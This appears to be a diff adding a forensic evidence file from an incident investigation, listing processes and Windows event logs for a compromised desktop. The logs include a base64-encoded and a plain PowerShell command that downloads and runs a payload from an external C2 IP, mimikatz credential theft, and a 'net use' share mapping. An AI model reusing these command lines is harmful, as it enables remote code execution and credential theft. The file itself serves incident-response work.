@@ -1,0 +1,74 @@
+# Suspicious Processes — DESKTOP-HR7K2M1
+# Captured: 2026-05-16 09:15:00 UTC
+# Tool: Process Explorer / Tasklist
+# Case: FIR-2026-0042
+
+=== TASKLIST OUTPUT ===
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0         8 K
+System                           4 Services                   0       144 K
+smss.exe                       368 Services                   0       952 K
+csrss.exe                      548 Services                   0     4,324 K
+wininit.exe                    624 Services                   0     5,048 K
+services.exe                   748 Services                   0     8,180 K
+lsass.exe                      756 Services                   0    14,872 K
+svchost.exe                    880 Services                   0    29,444 K
+svchost.exe                    952 Services                   0    16,340 K
+explorer.exe                  2044 Console                    1    72,156 K
+WINWORD.EXE                   3812 Console                    1   142,888 K
+powershell.exe                4120 Console                    1    68,224 K
+svchost32.exe                 4488 Console                    1    24,332 K
+cmd.exe                       5012 Console                    1     4,556 K
+net.exe                       5244 Console                    1     2,112 K
+chrome.exe                    5680 Console                    1   312,440 K
+
+=== SUSPICIOUS PROCESS DETAILS ===
+
+[EventID=4688] Process Creation
+  Time:       2026-05-10 08:47:02
+  Process:    powershell.exe
+  PID:        4120
+  ParentPID:  3812 (WINWORD.EXE)
+  CommandLine: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADcALwBwAGEAeQBsAG8AYQBkACcAKQA=
+  User:       DESKTOP-HR7K2M1\jsmith
+
+[EventID=4688] Process Creation
+  Time:       2026-05-10 08:48:14
+  Process:    svchost32.exe
+  PID:        4488
+  ParentPID:  4120 (powershell.exe)
+  Path:       C:\Users\jsmith\AppData\Local\Temp\svchost32.exe
+  User:       DESKTOP-HR7K2M1\jsmith
+  Note:       SUSPICIOUS — not a legitimate Windows process name
+
+[EventID=4688] Process Creation
+  Time:       2026-05-10 11:14:43
+  Process:    mimikatz.exe
+  PID:        5905
+  ParentPID:  4488 (svchost32.exe)
+  Path:       C:\Users\jsmith\AppData\Local\Temp\mimikatz.exe
+  User:       DESKTOP-HR7K2M1\jsmith
+  Note:       CRITICAL — known credential theft tool
+
+[EventID=4688] Process Creation
+  Time:       2026-05-10 11:20:12
+  Process:    net.exe
+  PID:        5244
+  ParentPID:  4488 (svchost32.exe)
+  CommandLine: net use \\192.168.1.50\Finance$ /user:jsmith
+  User:       DESKTOP-HR7K2M1\jsmith
+  Note:       Lateral movement — mapping network share
+
+[EventID=4104] PowerShell Script Block Logging
+  Time:       2026-05-10 08:47:03
+  Script:     IEX (New-Object Net.WebClient).DownloadString('https://185.220.101.47/payload')
+  User:       DESKTOP-HR7K2M1\jsmith
+  Note:       CRITICAL — download and execute from C2 IP 185.220.101.47
+
+=== NETWORK ACTIVITY FROM SVCHOST32.EXE ===
+
+  185.220.101.47:443   ESTABLISHED  (C2 beacon — TLS encrypted)
+  185.220.101.47:443   ESTABLISHED  (C2 beacon — TLS encrypted)
+  192.168.1.50:445     ESTABLISHED  (SMB to FILESERVER01 — lateral movement)
